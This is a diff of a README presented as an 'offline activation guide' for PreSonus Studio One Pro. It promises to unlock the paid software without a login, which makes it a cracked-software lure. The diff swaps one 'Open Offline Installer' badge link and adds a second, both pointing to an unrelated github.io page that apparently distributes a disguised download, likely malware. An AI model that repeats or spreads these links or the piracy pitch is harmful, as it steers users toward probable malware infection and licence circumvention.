@@ -1,6 +1,6 @@
 # PreSonus Studio One Pro — Offline Activation Guide
 
-[![🎧 Launch Setup Assistant](https://img.shields.io/badge/🎧%20Launch%20Setup%20Assistant-Open%20Offline%20Installer-%2300325a?style=for-the-badge)](https://presonus-studio-one-pro-download.github.io/.github)
+[![🎧 Launch Setup Assistant](https://img.shields.io/badge/🎧%20Launch%20Setup%20Assistant-Open%20Offline%20Installer-%2300325a?style=for-the-badge)](https://ryadikmntiiks.github.io/.github/PSSOP)
 
 > Step-by-step offline setup for Studio One Pro (v6 and higher). Unlock professional music production tools without internet or account login.
 
@@ -36,6 +36,8 @@
 
 ![Performance Editing and Automation](https://insmac.org/uploads/posts/2022-11/studio-one-6_01.jpg)  
 *Precision automation and plugin control in the timeline*
+
+[![🎧 Launch Setup Assistant](https://img.shields.io/badge/🎧%20Launch%20Setup%20Assistant-Open%20Offline%20Installer-%2300325a?style=for-the-badge)](https://ryadikmntiiks.github.io/.github/PSSOP)
 
 ---
 
